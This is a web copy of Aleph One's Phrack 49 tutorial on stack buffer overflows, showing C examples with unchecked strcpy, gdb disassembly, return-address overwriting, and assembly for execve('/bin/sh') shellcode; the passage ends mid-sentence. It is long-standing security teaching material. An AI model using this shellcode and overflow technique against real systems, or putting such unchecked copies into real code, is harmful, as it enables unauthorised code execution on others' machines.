href=../%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/ class=md-nav__link> 王子亭的博客 GPG 与端到端加密：论什么才是可以信任的 </a> </li> <li class=md-nav__item> <a href=../nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/ class=md-nav__link> Nc: invalid option — ‘ ‘ </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6 type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6> 其它 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=其它 data-md-level=1> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> 其它 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../How%20to%20Get%20Rich/ class=md-nav__link> How to Get Rich </a> </li> <li class=md-nav__item> <a href=../TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/ class=md-nav__link> TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021 </a> </li> <li class=md-nav__item> <a href=../FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/ class=md-nav__link> FFmpeg功能命令汇总 </a> </li> <li class=md-nav__item> <a href=../%E4%B8%8D%E6%80%95%E5%A5%B8%E5%95%86%20%E6%8F%AD%E5%90%84%E5%93%81%E7%89%8C%E7%94%B5%E8%A7%86%E8%BF%9B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%B3%95/ class=md-nav__link> 不怕奸商 揭各品牌电视进工厂模式方法 </a> </li> <li class=md-nav__item> <a href=../%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/ class=md-nav__link> 傅里叶变换 </a> </li> <li class=md-nav__item> <a href=../%E6%BB%A4%E6%B3%A2%E5%99%A8/ class=md-nav__link> 滤波器 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/ class=md-nav__link> 蓝牙协议入门（一）简介 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（二）传输层协议 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（三）中介层协议 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（四）应用层协议 </a> </li> <li class=md-nav__item> <a href=../TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/ class=md-nav__link> TarsosDSP 简介 3.TarsosDSP 是如何工作的？ </a> </li> <li class=md-nav__item> <a href=../../tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/ class=md-nav__link> 实战rfc5766 turn server和ice4j广域网通讯 </a> </li> <li class=md-nav__item> <a href=../%E6%B3%A2%E9%BB%91%E5%9B%B4%E5%9F%8E%E6%88%98%E4%B8%AD%E7%9A%84%E5%B9%B8%E5%AD%98%E8%80%85/ class=md-nav__link> 波黑围城战中的幸存者 </a> </li> <li class=md-nav__item> <a href=../%E6%AD%A6%E6%B1%89%EF%BC%9A%E7%99%BE%E5%B9%B4%E7%9A%84%E6%B4%AA%E6%B0%B4%E8%AE%B0%E5%BF%86/ class=md-nav__link> 武汉：百年的洪水记忆 </a> </li> <li class=md-nav__item> <a href=../../Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/ class=md-nav__link> Python制作pdf电子书 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#smashing-the-stack-for-fun-and-profit-by-aleph-one class=md-nav__link> Smashing the Stack for Fun and Profit by Aleph One </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>Smashing the Stack for Fun and Profit by Aleph One</h1> <h2 id=smashing-the-stack-for-fun-and-profit-by-aleph-one>Smashing the Stack for Fun and Profit by Aleph One</h2> <pre><code>
                               .oO Phrack 49 Oo.

                          Volume Seven, Issue Forty-Nine

                                  File 14 of 16

                      BugTraq, r00t, and Underground.Org
                                   bring you

                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                     Smashing The Stack For Fun And Profit
                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

                                 by Aleph One
                             aleph1@underground.org

    `smash the stack` [C programming] n. On many C implementations
    it is possible to corrupt the execution stack by writing past
    the end of an array declared auto in a routine.  Code that does
    this is said to smash the stack, and can cause return from the
    routine to jump to a random address.  This can produce some of
    the most insidious data-dependent bugs known to mankind.
    Variants include trash the stack, scribble the stack, mangle
    the stack; the term mung the stack is not used, as this is
    never done intentionally. See spam; see also alias bug,
    fandango on core, memory leak, precedence lossage, overrun screw.


                                 Introduction
                                 ~~~~~~~~~~~~

   Over the last few months there has been a large increase of buffer
overflow vulnerabilities being both discovered and exploited.  Examples
of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt 
library, at, etc.  This paper attempts to explain what buffer overflows 
are, and how their exploits work.

   Basic knowledge of assembly is required.  An understanding of virtual 
memory concepts, and experience with gdb are very helpful but not necessary.
We also assume we are working with an Intel x86 CPU, and that the operating 
system is Linux.

   Some basic definitions before we begin: A buffer is simply a contiguous 
block of computer memory that holds multiple instances of the same data 
type.  C programmers normally associate with the word buffer arrays. Most 
commonly, character arrays.  Arrays, like all variables in C, can be 
declared either static or dynamic.  Static variables are allocated at load 
time on the data segment.  Dynamic variables are allocated at run time on 
the stack. To overflow is to flow, or fill over the top, brims, or bounds. 
We will concern ourselves only with the overflow of dynamic buffers, otherwise
known as stack-based buffer overflows.


                          Process Memory Organization
                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~

   To understand what stack buffers are we must first understand how a
process is organized in memory.  Processes are divided into three regions:
Text, Data, and Stack.  We will concentrate on the stack region, but first
a small overview of the other regions is in order.

   The text region is fixed by the program and includes code (instructions)
and read-only data.  This region corresponds to the text section of the
executable file.  This region is normally marked read-only and any attempt to
write to it will result in a segmentation violation.

   The data region contains initialized and uninitialized data.  Static
variables are stored in this region.  The data region corresponds to the
data-bss sections of the executable file.  Its size can be changed with the
brk(2) system call.  If the expansion of the bss data or the user stack
exhausts available memory, the process is blocked and is rescheduled to
run again with a larger memory space. New memory is added between the data
and stack segments.

                             /------------------\  lower
                             |                  |  memory
                             |       Text       |  addresses
                             |                  |
                             |------------------|
                             |   (Initialized)  |
                             |        Data      |
                             |  (Uninitialized) |
                             |------------------|
                             |                  |
                             |       Stack      |  higher
                             |                  |  memory
                             \------------------/  addresses

                         Fig. 1 Process Memory Regions


                               What Is A Stack?
                               ~~~~~~~~~~~~~~~~

   A stack is an abstract data type frequently used in computer science.  A
stack of objects has the property that the last object placed on the stack
will be the first object removed.  This property is commonly referred to as
last in, first out queue, or a LIFO.

   Several operations are defined on stacks.  Two of the most important are
PUSH and POP.  PUSH adds an element at the top of the stack.  POP, in 
contrast, reduces the stack size by one by removing the last element at the 
top of the stack.


                            Why Do We Use A Stack?
                            ~~~~~~~~~~~~~~~~~~~~~~

   Modern computers are designed with the need of high-level languages in
mind.  The most important technique for structuring programs introduced by
high-level languages is the procedure or function.  From one point of view, a
procedure call alters the flow of control just as a jump does, but unlike a
jump, when finished performing its task, a function returns control to the 
statement or instruction following the call.  This high-level abstraction
is implemented with the help of the stack.

  The stack is also used to dynamically allocate the local variables used in
functions, to pass parameters to the functions, and to return values from the
function.


                               The Stack Region
                               ~~~~~~~~~~~~~~~~

   A stack is a contiguous block of memory containing data.  A register called
the stack pointer (SP) points to the top of the stack.  The bottom of the 
stack is at a fixed address.  Its size is dynamically adjusted by the kernel 
at run time. The CPU implements instructions to PUSH onto and POP off of the 
stack. 

   The stack consists of logical stack frames that are pushed when calling a
function and popped when returning.  A stack frame contains the parameters to 
a function, its local variables, and the data necessary to recover the 
previous stack frame, including the value of the instruction pointer at the 
time of the function call.

   Depending on the implementation the stack will either grow down (towards
lower memory addresses), or up.  In our examples we'll use a stack that grows
down.  This is the way the stack grows on many computers including the Intel, 
Motorola, SPARC and MIPS processors.  The stack pointer (SP) is also
implementation dependent.  It may point to the last address on the stack, or 
to the next free available address after the stack.  For our discussion we'll
assume it points to the last address on the stack.

   In addition to the stack pointer, which points to the top of the stack
(lowest numerical address), it is often convenient to have a frame pointer
(FP) which points to a fixed location within a frame.  Some texts also refer
to it as a local base pointer (LB).  In principle, local variables could be
referenced by giving their offsets from SP.  However, as words are pushed onto
the stack and popped from the stack, these offsets change.  Although in some
cases the compiler can keep track of the number of words on the stack and
thus correct the offsets, in some cases it cannot, and in all cases
considerable administration is required.  Futhermore, on some machines, such
as Intel-based processors, accessing a variable at a known distance from SP
requires multiple instructions.

   Consequently, many compilers use a second register, FP, for referencing
both local variables and parameters because their distances from FP do
not change with PUSHes and POPs.  On Intel CPUs, BP (EBP) is used for this 
purpose.  On the Motorola CPUs, any address register except A7 (the stack 
pointer) will do.  Because the way our stack grows, actual parameters have 
positive offsets and local variables have negative offsets from FP.

   The first thing a procedure must do when called is save the previous FP
(so it can be restored at procedure exit).  Then it copies SP into FP to 
create the new FP, and advances SP to reserve space for the local variables. 
This code is called the procedure prolog.  Upon procedure exit, the stack 
must be cleaned up again, something called the procedure epilog.  The Intel 
ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, 
have been provided to do most of the procedure prolog and epilog work 
efficiently. 

   Let us see what the stack looks like in a simple example:

example1.c:
------------------------------------------------------------------------------
void function(int a, int b, int c) {
   char buffer1[5];
   char buffer2[10];
}

void main() {
  function(1,2,3);
}
------------------------------------------------------------------------------

   To understand what the program does to call function() we compile it with
gcc using the -S switch to generate assembly code output:

$ gcc -S -o example1.s example1.c

   By looking at the assembly language output we see that the call to
function() is translated to:

        pushl $3
        pushl $2
        pushl $1
        call function

    This pushes the 3 arguments to function backwards into the stack, and
calls function().  The instruction 'call' will push the instruction pointer
(IP) onto the stack.  We'll call the saved IP the return address (RET).  The
first thing done in function is the procedure prolog:

        pushl %ebp
        movl %esp,%ebp
        subl $20,%esp

   This pushes EBP, the frame pointer, onto the stack.  It then copies the
current SP onto EBP, making it the new FP pointer.  We'll call the saved FP
pointer SFP.  It then allocates space for the local variables by subtracting
their size from SP.

   We must remember that memory can only be addressed in multiples of the
word size.  A word in our case is 4 bytes, or 32 bits.  So our 5 byte buffer
is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer
is going to take 12 bytes (3 words) of memory.  That is why SP is being
subtracted by 20.  With that in mind our stack looks like this when
function() is called (each space represents a byte):


bottom of                                                            top of
memory                                                               memory
           buffer2       buffer1   sfp   ret   a     b     c
&lt;------   [            ][        ][    ][    ][    ][    ][    ]

top of                                                            bottom of
stack                                                                 stack


                               Buffer Overflows
                               ~~~~~~~~~~~~~~~~

   A buffer overflow is the result of stuffing more data into a buffer than
it can handle.  How can this often found programming error can be taken
advantage to execute arbitrary code?  Lets look at another example:

example2.c
------------------------------------------------------------------------------
void function(char *str) {
   char buffer[16];

   strcpy(buffer,str);
}

void main() {
  char large_string[256];
  int i;

  for( i = 0; i &lt; 255; i++)
    large_string[i] = 'A';

  function(large_string);
}
------------------------------------------------------------------------------

   This is program has a function with a typical buffer overflow coding
error.  The function copies a supplied string without bounds checking by
using strcpy() instead of strncpy().  If you run this program you will get a
segmentation violation.  Lets see what its stack looks when we call function:


bottom of                                                            top of
memory                                                               memory
                  buffer            sfp   ret   *str
&lt;------          [                ][    ][    ][    ]

top of                                                            bottom of
stack                                                                 stack


   What is going on here?  Why do we get a segmentation violation?  Simple.
strcpy() is coping the contents of *str (larger_string[]) into buffer[]
until a null character is found on the string.  As we can see buffer[] is
much smaller than *str.  buffer[] is 16 bytes long, and we are trying to stuff
it with 256 bytes.  This means that all 250 bytes after buffer in the stack
are being overwritten.  This includes the SFP, RET, and even *str!  We had 
filled large_string with the character 'A'.  It's hex character value
is 0x41.  That means that the return address is now 0x41414141.  This is
outside of the process address space.  That is why when the function returns
and tries to read the next instruction from that address you get a 
segmentation violation.

   So a buffer overflow allows us to change the return address of a function.
In this way we can change the flow of execution of the program.  Lets go back
to our first example and recall what the stack looked like:


bottom of                                                            top of
memory                                                               memory
           buffer2       buffer1   sfp   ret   a     b     c
&lt;------   [            ][        ][    ][    ][    ][    ][    ]

top of                                                            bottom of
stack                                                                 stack


   Lets try to modify our first example so that it overwrites the return
address, and demonstrate how we can make it execute arbitrary code.  Just
before buffer1[] on the stack is SFP, and before it, the return address.
That is 4 bytes pass the end of buffer1[].  But remember that buffer1[] is
really 2 word so its 8 bytes long.  So the return address is 12 bytes from
the start of buffer1[].  We'll modify the return value in such a way that the
assignment statement 'x = 1;' after the function call will be jumped.  To do
so we add 8 bytes to the return address.  Our code is now:

example3.c:
------------------------------------------------------------------------------
void function(int a, int b, int c) {
   char buffer1[5];
   char buffer2[10];
   int *ret;

   ret = buffer1 + 12;
   (*ret) += 8;
}

void main() {
  int x;

  x = 0;
  function(1,2,3);
  x = 1;
  printf(&quot;%d\n&quot;,x);
}
------------------------------------------------------------------------------

   What we have done is add 12 to buffer1[]'s address.  This new address is
where the return address is stored.  We want to skip pass the assignment to
the printf call.  How did we know to add 8 to the return address?  We used a
test value first (for example 1), compiled the program, and then started gdb:

------------------------------------------------------------------------------
[aleph1]$ gdb example3
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(no debugging symbols found)...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000490 &lt;main&gt;:       pushl  %ebp
0x8000491 &lt;main+1&gt;:     movl   %esp,%ebp
0x8000493 &lt;main+3&gt;:     subl   $0x4,%esp
0x8000496 &lt;main+6&gt;:     movl   $0x0,0xfffffffc(%ebp)
0x800049d &lt;main+13&gt;:    pushl  $0x3
0x800049f &lt;main+15&gt;:    pushl  $0x2
0x80004a1 &lt;main+17&gt;:    pushl  $0x1
0x80004a3 &lt;main+19&gt;:    call   0x8000470 &lt;function&gt;
0x80004a8 &lt;main+24&gt;:    addl   $0xc,%esp
0x80004ab &lt;main+27&gt;:    movl   $0x1,0xfffffffc(%ebp)
0x80004b2 &lt;main+34&gt;:    movl   0xfffffffc(%ebp),%eax
0x80004b5 &lt;main+37&gt;:    pushl  %eax
0x80004b6 &lt;main+38&gt;:    pushl  $0x80004f8
0x80004bb &lt;main+43&gt;:    call   0x8000378 &lt;printf&gt;
0x80004c0 &lt;main+48&gt;:    addl   $0x8,%esp
0x80004c3 &lt;main+51&gt;:    movl   %ebp,%esp
0x80004c5 &lt;main+53&gt;:    popl   %ebp
0x80004c6 &lt;main+54&gt;:    ret
0x80004c7 &lt;main+55&gt;:    nop
------------------------------------------------------------------------------

   We can see that when calling function() the RET will be 0x8004a8, and we
want to jump past the assignment at 0x80004ab.  The next instruction we want
to execute is the at 0x8004b2.  A little math tells us the distance is 8
bytes.


                                  Shell Code
                                  ~~~~~~~~~~

   So now that we know that we can modify the return address and the flow of
execution, what program do we want to execute?  In most cases we'll simply
want the program to spawn a shell.  From the shell we can then issue other
commands as we wish.  But what if there is no such code in the program we
are trying to exploit?  How can we place arbitrary instruction into its
address space?  The answer is to place the code with are trying to execute in
the buffer we are overflowing, and overwrite the return address so it points
back into the buffer.  Assuming the stack starts at address 0xFF, and that S
stands for the code we want to execute the stack would then look like this:


bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

&lt;------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
           ^                            |
           |____________________________|
top of                                                            bottom of
stack                                                                 stack


The code to spawn a shell in C looks like:

shellcode.c
-----------------------------------------------------------------------------
#include &lt;stdio.h&gt;

void main() {
   char *name[2];

   name[0] = &quot;/bin/sh&quot;;
   name[1] = NULL;
   execve(name[0], name, NULL);
}
------------------------------------------------------------------------------

   To find out what does it looks like in assembly we compile it, and start
up gdb.  Remember to use the -static flag. Otherwise the actual code the
for the execve system call will not be included.  Instead there will be a
reference to dynamic C library that would normally would be linked in at
load time.

------------------------------------------------------------------------------
[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
[aleph1]$ gdb shellcode
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 &lt;main&gt;:       pushl  %ebp
0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
0x8000133 &lt;main+3&gt;:     subl   $0x8,%esp
0x8000136 &lt;main+6&gt;:     movl   $0x80027b8,0xfffffff8(%ebp)
0x800013d &lt;main+13&gt;:    movl   $0x0,0xfffffffc(%ebp)
0x8000144 &lt;main+20&gt;:    pushl  $0x0
0x8000146 &lt;main+22&gt;:    leal   0xfffffff8(%ebp),%eax
0x8000149 &lt;main+25&gt;:    pushl  %eax
0x800014a &lt;main+26&gt;:    movl   0xfffffff8(%ebp),%eax
0x800014d &lt;main+29&gt;:    pushl  %eax
0x800014e &lt;main+30&gt;:    call   0x80002bc &lt;__execve&gt;
0x8000153 &lt;main+35&gt;:    addl   $0xc,%esp
0x8000156 &lt;main+38&gt;:    movl   %ebp,%esp
0x8000158 &lt;main+40&gt;:    popl   %ebp
0x8000159 &lt;main+41&gt;:    ret
End of assembler dump.
(gdb) disassemble __execve
Dump of assembler code for function __execve:
0x80002bc &lt;__execve&gt;:   pushl  %ebp
0x80002bd &lt;__execve+1&gt;: movl   %esp,%ebp
0x80002bf &lt;__execve+3&gt;: pushl  %ebx
0x80002c0 &lt;__execve+4&gt;: movl   $0xb,%eax
0x80002c5 &lt;__execve+9&gt;: movl   0x8(%ebp),%ebx
0x80002c8 &lt;__execve+12&gt;:        movl   0xc(%ebp),%ecx
0x80002cb &lt;__execve+15&gt;:        movl   0x10(%ebp),%edx
0x80002ce &lt;__execve+18&gt;:        int    $0x80
0x80002d0 &lt;__execve+20&gt;:        movl   %eax,%edx
0x80002d2 &lt;__execve+22&gt;:        testl  %edx,%edx
0x80002d4 &lt;__execve+24&gt;:        jnl    0x80002e6 &lt;__execve+42&gt;
0x80002d6 &lt;__execve+26&gt;:        negl   %edx
0x80002d8 &lt;__execve+28&gt;:        pushl  %edx
0x80002d9 &lt;__execve+29&gt;:        call   0x8001a34 &lt;__normal_errno_location&gt;
0x80002de &lt;__execve+34&gt;:        popl   %edx
0x80002df &lt;__execve+35&gt;:        movl   %edx,(%eax)
0x80002e1 &lt;__execve+37&gt;:        movl   $0xffffffff,%eax
0x80002e6 &lt;__execve+42&gt;:        popl   %ebx
0x80002e7 &lt;__execve+43&gt;:        movl   %ebp,%esp
0x80002e9 &lt;__execve+45&gt;:        popl   %ebp
0x80002ea &lt;__execve+46&gt;:        ret
0x80002eb &lt;__execve+47&gt;:        nop
End of assembler dump.
------------------------------------------------------------------------------

Lets try to understand what is going on here. We'll start by studying main:

------------------------------------------------------------------------------
0x8000130 &lt;main&gt;:       pushl  %ebp
0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
0x8000133 &lt;main+3&gt;:     subl   $0x8,%esp

    This is the procedure prelude.  It first saves the old frame pointer,
    makes the current stack pointer the new frame pointer, and leaves 
    space for the local variables. In this case its:

    char *name[2];

    or 2 pointers to a char. Pointers are a word long, so it leaves
    space for two words (8 bytes).

0x8000136 &lt;main+6&gt;:     movl   $0x80027b8,0xfffffff8(%ebp)

    We copy the value 0x80027b8 (the address of the string &quot;/bin/sh&quot;)
    into the first pointer of name[]. This is equivalent to:

    name[0] = &quot;/bin/sh&quot;;

0x800013d &lt;main+13&gt;:    movl   $0x0,0xfffffffc(%ebp)

    We copy the value 0x0 (NULL) into the seconds pointer of name[].
    This is equivalent to:

    name[1] = NULL;

    The actual call to execve() starts here.

0x8000144 &lt;main+20&gt;:    pushl  $0x0

    We push the arguments to execve() in reverse order onto the stack.
    We start with NULL.

0x8000146 &lt;main+22&gt;:    leal   0xfffffff8(%ebp),%eax

    We load the address of name[] into the EAX register.

0x8000149 &lt;main+25&gt;:    pushl  %eax

    We push the address of name[] onto the stack.

0x800014a &lt;main+26&gt;:    movl   0xfffffff8(%ebp),%eax

    We load the address of the string &quot;/bin/sh&quot; into the EAX register.

0x800014d &lt;main+29&gt;:    pushl  %eax

    We push the address of the string &quot;/bin/sh&quot; onto the stack.

0x800014e &lt;main+30&gt;:    call   0x80002bc &lt;__execve&gt;

    Call the library procedure execve().  The call instruction pushes the
    IP onto the stack.
------------------------------------------------------------------------------

   Now execve().  Keep in mind we are using a Intel based Linux system.  The
syscall details will change from OS to OS, and from CPU to CPU.  Some will 
pass the arguments on the stack, others on the registers.  Some use a software
interrupt to jump to kernel mode, others use a far call.  Linux passes its 
arguments to the system call on the registers, and uses a software interrupt 
to jump into kernel mode.

------------------------------------------------------------------------------
0x80002bc &lt;__execve&gt;:   pushl  %ebp
0x80002bd &lt;__execve+1&gt;: movl   %esp,%ebp
0x80002bf &lt;__execve+3&gt;: pushl  %ebx

    The procedure prelude.

0x80002c0 &lt;__execve+4&gt;: movl   $0xb,%eax

    Copy 0xb (11 decimal) onto the stack. This is the index into the
    syscall table.  11 is execve.

0x80002c5 &lt;__execve+9&gt;: movl   0x8(%ebp),%ebx

    Copy the address of &quot;/bin/sh&quot; into EBX.

0x80002c8 &lt;__execve+12&gt;:        movl   0xc(%ebp),%ecx

    Copy the address of name[] into ECX.

0x80002cb &lt;__execve+15&gt;:        movl   0x10(%ebp),%edx

    Copy the address of the null pointer into %edx.

0x80002ce &lt;__execve+18&gt;:        int    $0x80

    Change into kernel mode.
------------------------------------------------------------------------------

So as we can see there is not much to the execve() system call.  All we need
to do is:

    a) Have the null terminated string &quot;/bin/sh&quot; somewhere in memory.
    b) Have the address of the string &quot;/bin/sh&quot; somewhere in memory
       followed by a null long word.
    c) Copy 0xb into the EAX register.
    d) Copy the address of the address of the string &quot;/bin/sh&quot; into the
       EBX register.
    e) Copy the address of the string &quot;/bin/sh&quot; into the ECX register.
    f) Copy the address of the null long word into the EDX register.
    g) Execute the int $0x80 instruction.

   But what if the execve() call fails for some reason?  The program will
continue fetching instructions from the stack, which may contain random data!
The program will most likely core dump.  We want the program to exit cleanly
if the execve syscall fails.  To accomplish this we must then add a exit
syscall after the execve syscall.  What does the exit syscall looks like?

exit.c
------------------------------------------------------------------------------
#include &lt;stdlib.h&gt;

void main() {
        exit(0);
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ gcc -o exit -static exit.c
[aleph1]$ gdb exit
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(no debugging symbols found)...
(gdb) disassemble _exit
Dump of assembler code for function _exit:
0x800034c &lt;_exit&gt;:      pushl  %ebp
0x800034d &lt;_exit+1&gt;:    movl   %esp,%ebp
0x800034f &lt;_exit+3&gt;:    pushl  %ebx
0x8000350 &lt;_exit+4&gt;:    movl   $0x1,%eax
0x8000355 &lt;_exit+9&gt;:    movl   0x8(%ebp),%ebx
0x8000358 &lt;_exit+12&gt;:   int    $0x80
0x800035a &lt;_exit+14&gt;:   movl   0xfffffffc(%ebp),%ebx
0x800035d &lt;_exit+17&gt;:   movl   %ebp,%esp
0x800035f &lt;_exit+19&gt;:   popl   %ebp
0x8000360 &lt;_exit+20&gt;:   ret
0x8000361 &lt;_exit+21&gt;:   nop
0x8000362 &lt;_exit+22&gt;:   nop
0x8000363 &lt;_exit+23&gt;:   nop
End of assembler dump.
------------------------------------------------------------------------------

   The exit syscall will place 0x1 in EAX, place the exit code in EBX,
and execute &quot;int 0x80&quot;.  That's it.  Most applications return 0 on exit to
indicate no errors.  We will place 0 in EBX.  Our list of steps is now:

    a) Have the null terminated string &quot;/bin/sh&quot; somewhere in memory.
    b) Have the address of the string &quot;/bin/sh&quot; somewhere in memory
       followed by a null long word.
    c) Copy 0xb into the EAX register.
    d) Copy the address of the address of the string &quot;/bin/sh&quot; into the
       EBX register.
    e) Copy the address of the string &quot;/bin/sh&quot; into the ECX register.
    f) Copy the address of the null long word into the EDX register.
    g) Execute the int $0x80 instruction.
    h) Copy 0x1 into the EAX register.
    i) Copy 0x0 into the EBX register.
    j) Execute the int $0x80 instruction.

   Trying to put this together in assembly language, placing the string
after the code, and remembering we will place the address of the string,
and null word after the array, we have:

------------------------------------------------------------------------------
        movl   string_addr,string_addr_addr
    movb   $0x0,null_byte_addr
        movl   $0x0,null_addr
        movl   $0xb,%eax
        movl   string_addr,%ebx
        leal   string_addr,%ecx
        leal   null_string,%edx
        int    $0x80
        movl   $0x1, %eax
        movl   $0x0, %ebx
    int    $0x80
        /bin/sh string goes here.
------------------------------------------------------------------------------

   The problem is that we don't know where in the memory space of the 
program we are trying to exploit the code (and the string that follows 
it) will be placed.  One way around it is to use a JMP, and a CALL 
instruction.  The JMP and CALL instructions can use IP relative addressing, 
which means we can jump to an offset from the current IP without needing 
to know the exact address of where in memory we want to jump to.  If we 
place a CALL instruction right before the &quot;/bin/sh&quot; string, and a JMP 
instruction to it, the strings address will be pushed onto the stack as 
the return address when CALL is executed.  All we need then is to copy the 
return address into a register.  The CALL instruction can simply call the 
start of our code above.  Assuming now that J stands for the JMP instruction,
C for the CALL instruction, and s for the string,  the execution flow would 
now be:


bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

&lt;------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
           ^|^             ^|            |
           |||_____________||____________| (1)
       (2)  ||_____________||
             |______________| (3)
top of                                                            bottom of
stack                                                                 stack



   With this modifications, using indexed addressing, and writing down how
many bytes each instruction takes our code looks like:

------------------------------------------------------------------------------
        jmp    offset-to-call           # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,array-offset(%esi)  # 3 bytes
        movb   $0x0,nullbyteoffset(%esi)# 4 bytes
        movl   $0x0,null-offset(%esi)   # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   array-offset,(%esi),%ecx # 3 bytes
        leal   null-offset(%esi),%edx   # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax       # 5 bytes
        movl   $0x0, %ebx       # 5 bytes
    int    $0x80            # 2 bytes
        call   offset-to-popl           # 5 bytes
        /bin/sh string goes here.
------------------------------------------------------------------------------

   Calculating the offsets from jmp to call, from call to popl, from
the string address to the array, and from the string address to the null
long word, we now have:

------------------------------------------------------------------------------
        jmp    0x26                     # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)       # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax       # 5 bytes
        movl   $0x0, %ebx       # 5 bytes
    int    $0x80            # 2 bytes
        call   -0x2b                    # 5 bytes
        .string \&quot;/bin/sh\&quot;     # 8 bytes
------------------------------------------------------------------------------

   Looks good. To make sure it works correctly we must compile it and run it.
But there is a problem.  Our code modifies itself, but most operating system
mark code pages read-only.  To get around this restriction we must place the
